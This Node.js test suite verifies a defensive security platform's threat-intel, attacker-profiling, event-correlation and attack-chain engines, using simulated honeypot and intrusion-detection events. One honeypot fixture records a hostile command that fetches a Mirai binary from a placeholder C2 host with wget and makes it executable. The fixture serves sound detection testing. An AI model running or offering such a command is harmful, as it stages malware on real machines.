/**
 * Shadow Guard 2.0 - Stage 4 Verification Suite
 *
 * Verifies:
 *   1. Threat Intelligence Engine (IP, Domain, SHA-256 lookup, TTL cache hit/miss, rate-limit & honeypot boost)
 *   2. Attacker Behaviour Profiling Engine (Multi-source telemetry aggregation, zero password retention,
 *      7 behavioural patterns, and Explainable Weighted Risk Scoring 0-100)
 *   3. Event Correlation Engine (In-memory sliding time-window, event deduplication, rules CORR-01..CORR-06,
 *      and incident grouping without duplicate alert storms)
 *   4. Attack Chain Reconstruction Engine (MITRE ATT&CK kill-chain ordering, OBSERVED vs INFERRED vs SUSPECTED
 *      ontological certainty tiers, evidence references, and Mermaid graph generation)
 *   5. Service & Docker Compose structural integrity
 */

'use strict';

const fs = require('fs');
const path = require('path');

const { ThreatIntelEngine } = require('../threat-intelligence-service/providers/intelProviders');
const { AttackerProfilingEngine } = require('../attacker-profiling-service/engine/profilingEngine');
const { EventCorrelationEngine } = require('../event-correlation-service/engine/correlationEngine');
const { AttackChainBuilder } = require('../attack-chain-service/engine/attackChainBuilder');
const { createNormalizedEvent } = require('../shared/lib/eventContract');

let passed = 0;
let failed = 0;

function assert(condition, label, details = '') {
    if (condition) {
        passed += 1;
        console.log(`  [PASS] ${label}`);
    } else {
        failed += 1;
        console.error(`  [FAIL] ${label}${details ? ' -> ' + details : ''}`);
    }
}

async function runVerification() {
    console.log('================================================================================');
    console.log(' SHADOW GUARD 2.0 — STAGE 4 VERIFICATION SUITE');
    console.log(' Threat Intelligence, Attacker Profiling, Event Correlation & Attack Chains');
    console.log('================================================================================\n');

    // =========================================================================
    // TEST SUITE 1: Threat Intelligence Engine (:3012)
    // =========================================================================
    console.log('--- [Suite 1] Threat Intelligence Enrichment & TTL Caching ---');
    const intelEngine = new ThreatIntelEngine({ cacheTtlMs: 60000 });

    const ipMiss = await intelEngine.lookupIp('185.220.101.42');
    assert(ipMiss.is_malicious === true, 'Known malicious Tor/Brute-force IP flagged as malicious');
    assert(ipMiss.reputation_score >= 90, `Known IOC IP reputation score >= 90 (got ${ipMiss.reputation_score})`);
    assert(ipMiss.cache_hit === false, 'First lookup is a cache miss (cache_hit=false)');
    assert(Array.isArray(ipMiss.sources) && ipMiss.sources.length >= 2, 'Source attribution array populated');

    const ipHit = await intelEngine.lookupIp('185.220.101.42');
    assert(ipHit.cache_hit === true, 'Subsequent lookup within TTL returns from in-memory cache (cache_hit=true)');

    const internalSim = await intelEngine.lookupIp('192.168.1.100', { honeypot_hit: true });
    assert(internalSim.country_code === 'INTERNAL_LAB', 'RFC1918 IP classified as INTERNAL_LAB');
    assert(internalSim.is_malicious === true && internalSim.reputation_score >= 75, 'Honeypot interaction boosts reputation score');

    const domainIntel = await intelEngine.lookupDomain('c2.shadow-dropper.evil.example');
    assert(domainIntel.is_malicious === true && domainIntel.reputation_score >= 90, 'Malicious C2 domain identified');

    const hashIntel = await intelEngine.lookupHash('8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4');
    assert(
        hashIntel.is_malicious === true && hashIntel.malware_family === 'Linux.Mirai.Botnet.ELF',
        'Quarantined ELF malware SHA-256 hash identified as Linux.Mirai.Botnet.ELF'
    );

    const intelStats = intelEngine.getStats();
    assert(intelStats.total_lookups === 5 && intelStats.cache_hits === 1, 'Threat intel lookup & cache metrics accurate');

    // =========================================================================
    // TEST SUITE 2: Attacker Behaviour Profiling & Explainable Risk Scoring (:8004)
    // =========================================================================
    console.log('\n--- [Suite 2] Attacker Behaviour Profiling & Explainable Risk Scoring ---');
    const profilingEngine = new AttackerProfilingEngine({
        intelLookupFn: (ip, ctx) => intelEngine.lookupIp(ip, ctx)
    });

    const attackerIp = '185.220.101.42';
    const baseTime = new Date('2026-11-13T08:00:00.000Z').getTime();

    // 1. Sequential port scan across 4 ports (Window 1)
    for (const [idx, port] of [21, 22, 80, 445].entries()) {
        const scanEv = createNormalizedEvent({
            timestamp: new Date(baseTime + idx * 1000).toISOString(),
            source_service: 'suricata-event-collector-service',
            source_category: 'nids',
            event_type: 'SURICATA_SCAN',
            severity: 'MEDIUM',
            source_ip: attackerIp,
            destination_ip: '10.0.1.10',
            destination_port: port,
            protocol: 'TCP',
            nids_metadata: { signature_id: 2100001, signature: 'ET SCAN Rapid SYN Scan', category: 'Attempted Information Leak' }
        });
        await profilingEngine.ingestEvent(scanEv);
    }

    // 2. Cowrie SSH Brute-Force (3 failed logins) + 1 successful login + interactive shell + malware download (Window 2: +6 mins)
    const window2Time = baseTime + 6 * 60 * 1000;
    const cowrieAuthFail = createNormalizedEvent({
        timestamp: new Date(window2Time).toISOString(),
        source_service: 'honeypot-event-collector-service',
        source_category: 'deception',
        event_type: 'HONEYPOT_AUTH_FAILURE',
        severity: 'MEDIUM',
        source_ip: attackerIp,
        destination_ip: '172.29.0.10',
        destination_port: 2222,
        protocol: 'TCP',
        honeypot_metadata: {
            honeypot_id: 'cowrie-ssh-01',
            honeypot_type: 'cowrie',
            targeted_service: 'ssh',
            session_id: 'sess-cowrie-991',
            auth_outcome: 'FAILED',
            username_attempted: 'root',
            attempt_count: 3
        }
    });
    await profilingEngine.ingestEvent(cowrieAuthFail);

    const cowrieCmdAndFile = createNormalizedEvent({
        timestamp: new Date(window2Time + 5000).toISOString(),
        source_service: 'honeypot-event-collector-service',
        source_category: 'deception',
        event_type: 'HONEYPOT_COMMAND_EXECUTION',
        severity: 'CRITICAL',
        source_ip: attackerIp,
        destination_ip: '172.29.0.10',
        destination_port: 2222,
        protocol: 'TCP',
        honeypot_metadata: {
            honeypot_id: 'cowrie-ssh-01',
            honeypot_type: 'cowrie',
            targeted_service: 'ssh',
            session_id: 'sess-cowrie-991',
            auth_outcome: 'SUCCESS',
            username_attempted: 'admin',
            command_executed: 'uname -a && wget http://c2.shadow-dropper.evil.example/mirai.elf -O /tmp/mirai && chmod +x /tmp/mirai',
            file_sha256: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4',
            file_name: 'mirai.elf',
            download_url: 'http://c2.shadow-dropper.evil.example/mirai.elf'
        }
    });
    await profilingEngine.ingestEvent(cowrieCmdAndFile);

    // 3. OpenCanary SMB lateral probe (Second Honeypot sensor)
    const canarySmb = createNormalizedEvent({
        timestamp: new Date(window2Time + 12000).toISOString(),
        source_service: 'honeypot-event-collector-service',
        source_category: 'deception',
        event_type: 'OPEN_CANARY_SMB_PROBE',
        severity: 'HIGH',
        source_ip: attackerIp,
        destination_ip: '172.29.0.11',
        destination_port: 445,
        protocol: 'TCP',
        honeypot_metadata: {
            honeypot_id: 'opencanary-multi-01',
            honeypot_type: 'opencanary',
            targeted_service: 'smb',
            session_id: 'sess-canary-445'
        }
    });
    const profile = await profilingEngine.ingestEvent(canarySmb);

    assert(Boolean(profile && profile.id), 'Attacker profile generated with deterministic UUID');
    assert(
        profile.indicator_disclaimer.includes('Observed network indicator'),
        'Profile explicitly states Source IP is an observed indicator, not guaranteed single human identity'
    );
    assert(profile.failed_logins === 3 && profile.successful_logins === 1, 'Profile tracks failed (3) and successful (1) logins');
    assert(
        profile.usernames_attempted.includes('root') && profile.usernames_attempted.includes('admin'),
        'Profile stores attempted usernames without storing any passwords or hashes'
    );
    const profileJson = JSON.stringify(profile);
    assert(!/password_hash|plaintext_password/i.test(profileJson), 'Zero password or password hash fields in Attacker Profile');

    const patternIds = profile.behavioural_patterns.map(p => p.pattern_id);
    assert(patternIds.includes('repeated_auth_attempts'), 'Detected pattern: repeated_auth_attempts');
    assert(patternIds.includes('sequential_port_scan'), 'Detected pattern: sequential_port_scan');
    assert(patternIds.includes('service_enumeration'), 'Detected pattern: service_enumeration');
    assert(patternIds.includes('suspicious_command_execution'), 'Detected pattern: suspicious_command_execution');
    assert(patternIds.includes('cross_honeypot_access'), 'Detected pattern: cross_honeypot_access');
    assert(patternIds.includes('malicious_file_download'), 'Detected pattern: malicious_file_download');
    assert(patternIds.includes('temporal_persistence'), 'Detected pattern: temporal_persistence across 5-min windows');

    assert(
        profile.risk_assessment.final_score >= 85 && profile.risk_assessment.threat_level === 'CRITICAL',
        `Explainable risk score is CRITICAL (${profile.risk_assessment.final_score}/100)`
    );
    assert(
        profile.risk_assessment.contributing_factors.length === 5,
        'All 5 weighted risk factors populated with rationale and point breakdown'
    );
    assert(
        profile.risk_assessment.recommended_action === 'ISOLATE_AND_BLOCK',
        'Recommended action is ISOLATE_AND_BLOCK for critical multi-stage intruder'
    );

    // =========================================================================
    // TEST SUITE 3: Multi-Source Event Correlation Engine (:8005)
    // =========================================================================
    console.log('\n--- [Suite 3] Multi-Source Event Correlation & Incident Grouping ---');
    const correlationEngine = new EventCorrelationEngine({ windowMs: 15 * 60 * 1000, burstThreshold: 4 });

    // Correlate Scan event
    const scanEv1 = createNormalizedEvent({
        timestamp: new Date(baseTime).toISOString(),
        source_service: 'suricata-event-collector-service',
        source_category: 'nids',
        event_type: 'SURICATA_SCAN',
        severity: 'MEDIUM',
        source_ip: attackerIp,
        destination_ip: '10.0.1.10',
        destination_port: 22,
        protocol: 'TCP',
        nids_metadata: { signature_id: 2100001, signature: 'ET SCAN Rapid SYN Scan', category: 'Recon' }
    });
    const res1 = correlationEngine.correlateEvent(scanEv1);
    assert(res1.deduplicated === false, 'First NIDS scan event indexed in sliding window');

    // Send exact duplicate within 500ms -> should be deduplicated
    const scanEvDup = { ...scanEv1, timestamp: new Date(baseTime + 500).toISOString() };
    const resDup = correlationEngine.correlateEvent(scanEvDup);
    assert(resDup.deduplicated === true, 'Duplicate burst event within 2s window suppressed');

    // Add ML Flow Detection event
    const mlEv = createNormalizedEvent({
        timestamp: new Date(baseTime + 3000).toISOString(),
        source_service: 'traffic-capture-service',
        source_category: 'network',
        event_type: 'PORT_SCAN',
        severity: 'HIGH',
        source_ip: attackerIp,
        destination_ip: '10.0.1.10',
        destination_port: 2222,
        protocol: 'TCP',
        ml_metadata: { is_anomaly: true, anomaly_score: 0.91, attack_type: 'Port Scanning', confidence: 0.92 }
    });
    const resMl = correlationEngine.correlateEvent(mlEv);
    assert(resMl.correlated === true && resMl.incident_action === 'CREATED', 'Incident CREATED on NIDS + ML convergence (CORR-03)');

    const firstIncidentId = resMl.incident.incident_id;

    // Add Cowrie brute-force + command execution + payload drop + threat intel
    correlationEngine.correlateEvent(cowrieAuthFail);
    correlationEngine.correlateEvent({
        ...cowrieAuthFail,
        event_id: 'ev-fail-2',
        timestamp: new Date(window2Time + 2500).toISOString()
    });
    const resFinal = correlationEngine.correlateEvent(cowrieCmdAndFile, { threat_intel: ipMiss });

    assert(resFinal.correlated === true && resFinal.incident_action === 'UPDATED', 'Subsequent events merge into existing incident (UPDATED)');
    assert(resFinal.incident.incident_id === firstIncidentId, 'Incident grouping prevented duplicate incident creation');
    assert(resFinal.incident.severity === 'CRITICAL', 'Grouped incident escalated to CRITICAL severity');

    const triggeredRuleIds = resFinal.incident.matched_rules.map(r => r.rule_id);
    assert(triggeredRuleIds.includes('CORR-01'), 'Triggered CORR-01 (Recon-to-Deception Progression)');
    assert(triggeredRuleIds.includes('CORR-02'), 'Triggered CORR-02 (Credential Brute-Force to Shell Compromise)');
    assert(triggeredRuleIds.includes('CORR-03'), 'Triggered CORR-03 (NIDS Signature & ML Flow Anomaly Convergence)');
    assert(triggeredRuleIds.includes('CORR-04'), 'Triggered CORR-04 (Malware Staging / Exfiltration Kill-Chain)');
    assert(triggeredRuleIds.includes('CORR-05'), 'Triggered CORR-05 (Known Malicious Threat Actor Activity)');
    assert(triggeredRuleIds.includes('CORR-06'), 'Triggered CORR-06 (Sustained Multi-Event Threshold Burst)');

    // =========================================================================
    // TEST SUITE 4: Evidence-Based MITRE ATT&CK Chain Reconstruction (:8006)
    // =========================================================================
    console.log('\n--- [Suite 4] MITRE ATT&CK Chain Reconstruction (OBSERVED / INFERRED / SUSPECTED) ---');
    const chainBuilder = new AttackChainBuilder();

    // Test 4A: Reconstruct full chain from the grouped incident above
    const fullChain = chainBuilder.reconstructChain(resFinal.incident);
    assert(Boolean(fullChain && fullChain.chain_id), 'Attack chain reconstructed with UUID');
    assert(fullChain.kill_chain_depth >= 5, `Attack chain spans ${fullChain.kill_chain_depth} distinct MITRE ATT&CK tactics`);
    assert(fullChain.certainty_breakdown.OBSERVED >= 4, `Contains ${fullChain.certainty_breakdown.OBSERVED} OBSERVED stages`);
    assert(fullChain.certainty_breakdown.INFERRED >= 1, `Contains ${fullChain.certainty_breakdown.INFERRED} INFERRED stages`);
    assert(
        fullChain.stages.every(s => Array.isArray(s.evidence_event_ids) && s.evidence_event_ids.length > 0),
        'Every reconstructed stage links to concrete supporting event_id evidence'
    );
    assert(fullChain.mermaid_diagram.startsWith('flowchart LR'), 'Generates valid Mermaid flowchart LR diagram');

    // Test 4B: Verify SUSPECTED bridge stage insertion when Initial Access (TA0001) is unobserved between Recon (TA0043) and Exfiltration (TA0010)
    const gapIncident = {
        incident_id: 'inc-gap-test-001',
        source_ip: '198.51.100.77',
        severity: 'HIGH',
        confidence: 0.88,
        first_seen: new Date(baseTime).toISOString(),
        last_seen: new Date(baseTime + 60000).toISOString(),
        events_snapshot: [
            createNormalizedEvent({
                timestamp: new Date(baseTime).toISOString(),
                source_service: 'suricata-event-collector-service',
                source_category: 'nids',
                event_type: 'SURICATA_SCAN',
                severity: 'MEDIUM',
                source_ip: '198.51.100.77',
                destination_ip: '10.0.1.25',
                destination_port: 443,
                protocol: 'TCP',
                nids_metadata: { signature_id: 2100001, signature: 'ET SCAN Nmap', category: 'Recon' }
            }),
            createNormalizedEvent({
                timestamp: new Date(baseTime + 60000).toISOString(),
                source_service: 'traffic-capture-service',
                source_category: 'network',
                event_type: 'DATA_EXFILTRATION',
                severity: 'HIGH',
                source_ip: '198.51.100.77',
                destination_ip: '10.0.1.25',
                destination_port: 443,
                protocol: 'TCP'
            })
        ]
    };

    const gapChain = chainBuilder.reconstructChain(gapIncident);
    assert(
        gapChain.certainty_breakdown.OBSERVED === 1 &&
        gapChain.certainty_breakdown.INFERRED === 1 &&
        gapChain.certainty_breakdown.SUSPECTED === 1,
        'Gap chain distinguishes OBSERVED (Recon), SUSPECTED (Initial Access bridge), and INFERRED (Exfiltration)'
    );
    const suspectedNode = gapChain.stages.find(s => s.certainty_tier === 'SUSPECTED');
    assert(
        Boolean(suspectedNode) && suspectedNode.tactic_id === 'TA0001' && suspectedNode.confidence < 0.65,
        `SUSPECTED bridge node has decayed confidence (${suspectedNode ? suspectedNode.confidence : 'n/a'}) and cites bounding evidence`
    );

    // =========================================================================
    // TEST SUITE 5: File & Docker Compose Structural Integrity
    // =========================================================================
    console.log('\n--- [Suite 5] Stage 4 Service Files & Docker Compose Topology ---');
    const rootDir = path.resolve(__dirname, '..');
    const requiredFiles = [
        'threat-intelligence-service/index.js',
        'threat-intelligence-service/providers/intelProviders.js',
        'threat-intelligence-service/package.json',
        'threat-intelligence-service/Dockerfile',
        'attacker-profiling-service/index.js',
        'attacker-profiling-service/engine/profilingEngine.js',
        'attacker-profiling-service/package.json',
        'attacker-profiling-service/Dockerfile',
        'event-correlation-service/index.js',
        'event-correlation-service/engine/correlationEngine.js',
        'event-correlation-service/package.json',
        'event-correlation-service/Dockerfile',
        'attack-chain-service/index.js',
        'attack-chain-service/engine/attackChainBuilder.js',
        'attack-chain-service/package.json',
        'attack-chain-service/Dockerfile'
    ];

    for (const rel of requiredFiles) {
        const exists = fs.existsSync(path.join(rootDir, rel));
        assert(exists, `File exists: ${rel}`);
    }

    const composeContent = fs.readFileSync(path.join(rootDir, 'docker-compose.yml'), 'utf8');
    assert(composeContent.includes('threat-intelligence-service:'), 'docker-compose.yml defines threat-intelligence-service (:3012)');
    assert(composeContent.includes('attacker-profiling-service:'), 'docker-compose.yml defines attacker-profiling-service (:8004)');
    assert(composeContent.includes('event-correlation-service:'), 'docker-compose.yml defines event-correlation-service (:8005)');
    assert(composeContent.includes('attack-chain-service:'), 'docker-compose.yml defines attack-chain-service (:8006)');

    console.log('\n================================================================================');
    console.log(` STAGE 4 VERIFICATION SUMMARY: ${passed} PASSED, ${failed} FAILED`);
    console.log('================================================================================');

    if (failed > 0) {
        process.exit(1);
    }
}

runVerification().catch(err => {
    console.error('Fatal error in Stage 4 verification:', err);
    process.exit(1);
});
